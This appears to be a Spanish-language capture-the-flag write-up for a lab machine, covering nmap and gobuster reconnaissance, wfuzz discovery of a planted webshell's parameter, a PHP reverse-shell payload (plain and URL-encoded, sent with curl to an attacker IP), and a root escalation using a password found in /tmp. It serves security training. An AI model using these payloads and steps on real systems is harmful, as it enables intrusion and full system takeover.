## 1. Reconocimiento Inicial con Nmap
Iniciamos la auditoría realizando un escaneo de puertos para identificar la superficie de ataque expuesta.

```bash
nmap -sC -sV --open 172.17.0.2
```

 **Resultado del escaneo** 
```
80/tcp open  http    Apache httpd 2.4.57 ((Debian))  
|_http-server-header: Apache/2.4.57 (Debian)  
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)  
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

- `80/tcp open http Apache httpd 2.4.57 (Debian)`: Servidor web activo. El título de la página es "Academia de Inglés (Inglis Academi)".

_Nota: La descripción del ejercicio (o _briefing_) nos proporciona una pista contextual importante: "Guardo un secretito en /tmp ;)". Tendremos esto en cuenta para fases posteriores._

## 2. Enumeración de Contenido Web con Gobuster

Dado que se ha identificado un servidor web, el siguiente paso es enumerar directorios y archivos ocultos o no enlazados. 

```bash
gobuster dir -u http://<IP_DEL_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
```

**Resultado de Gobuster**
```
/index.html           (Status: 200) [Size: 2510]  
/shell.php            (Status: 500) [Size: 0]  
/warning.html         (Status: 200) [Size: 315]
```

Resultados:

*   `/index.html`: La página principal del sitio web.
*   `/shell.php`: Un archivo PHP que devuelve un código de estado `500` (Error Interno del Servidor) y un tamaño de 0 bytes. Esto es una fuerte indicación de que podría ser una webshell, pero que requiere un parámetro específico para funcionar correctamente.
- `/warning.html`: Al inspeccionar este archivo en el navegador, encontramos el siguiente mensaje: _"Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo..."_.

Esta pista confirma nuestras sospechas: existe una webshell funcional en `/shell.php`, pero necesitamos descubrir el nombre del parámetro mediante _fuzzing_.

Probamos, sin éxito a buscar texto ofuscado dentro de las imágenes `http://<ip>/<img>`.

### 3. Fuzzing de Parámetros con Wfuzz
Para descubrir el parámetro oculto que activa la funcionalidad de la webshell, utilizamos `wfuzz`. Inyectamos la palabra clave `FUZZ` en la posición del parámetro y le pasamos el valor `id` (un comando inofensivo de Linux). El objetivo es observar una respuesta diferencial (distinta a 0 líneas/palabras) cuando se adivine el parámetro correcto y el comando se ejecute.

```bash
wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://<IP_DEL_OBJETIVO>/shell.php?FUZZ=id"
```

- `--hl=0` oculta las respuestas que devuelven 0 líneas, filtrando así los intentos fallidos.

**Resultado**: "parameter". Comprobamos la Ejecución Remota de Comandos (RCE) accediendo a `http://<IP_DEL_OBJETIVO>/shell.php?parameter=whoami`, lo cual nos devuelve la ejecución esperada (ej. `www-data`).

![[WhereIsMyWebShell_Fuzzing.png]]

## 4. Obtención de una Reverse Shell

Confirmado el RCE, procedemos a establecer una conexión interactiva (Reverse Shell) hacia nuestra máquina atacante para mayor comodidad y estabilidad.

### 4.1. Preparación del Listener

En nuestra máquina atacante, configuramos `netcat` para escuchar conexiones entrantes.

```Bash
nc -nlvp 443
```

### 4.2. Ejecución del Payload

Utilizamos un payload clásico de Reverse Shell en PHP, adaptado con nuestra IP y puerto.

**Payload Base:**

![[WhereIsMyWebShell_Reverse_Shell.png]]

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Se ajusta la IP y el puerto a los de la máquina atacante (`172.17.0.1` y `443` respectivamente):

```php
php -r '$sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Para enviarlo de forma segura a través de la URL (método GET), codificamos el payload en formato URL (_URL Encode_):

```
php%20-r%20%27%24sock%3Dfsockopen(%22<IP_ATACANTE>%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

Inyectamos el payload codificado en la webshell:

```Bash
curl "http://<IP_DEL_OBJETIVO>/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22<IP_ATACANTE>%22%2C443)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27"
```

El terminal donde ejecutamos el listener recibe la conexión.

```Bash
$ whoami  
# www-data
```
## 5. Escalada de Privilegios

La pista inicial "Guardo un secretito en /tmp ;)" es fundamental para la escalada de privilegios. 

### 5.1. Búsqueda de Información Sensible

Navegamos al directorio temporal y listamos todos los archivos, incluyendo los ocultos (`-a` o `-la`).

```Bash
cd /tmp
ls -la
```

**Salida:**

```
drwxrwxrwt 1 root root  6 Aug  1 17:33 .  
drwxr-xr-x 1 root root 39 Aug  1 17:33 ..  
-rw-r--r-- 1 root root 21 Apr 12  2024 .secret.txt
```

Identificamos el archivo oculto `.secret.txt`. Al inspeccionar su contenido, obtenemos una contraseña en texto plano:
La contraseña `contraseñaderoot123` es la clave para escalar a `root`.

```Bash
cat .secret.txt  
# contraseñaderoot123
```

### 5.2. Escalada a Root

Asumiendo que esta es la contraseña del superusuario, utilizamos el comando `su` (Substitute User) para escalar privilegios. El uso del guion (`-`) asegura que carguemos completamente las variables de entorno de `root` (como el PATH).

```Bash
su -
# Password: contraseñaderoot123
```

Confirmamos el compromiso total del sistema:

```Bash
whoami  
# root
```
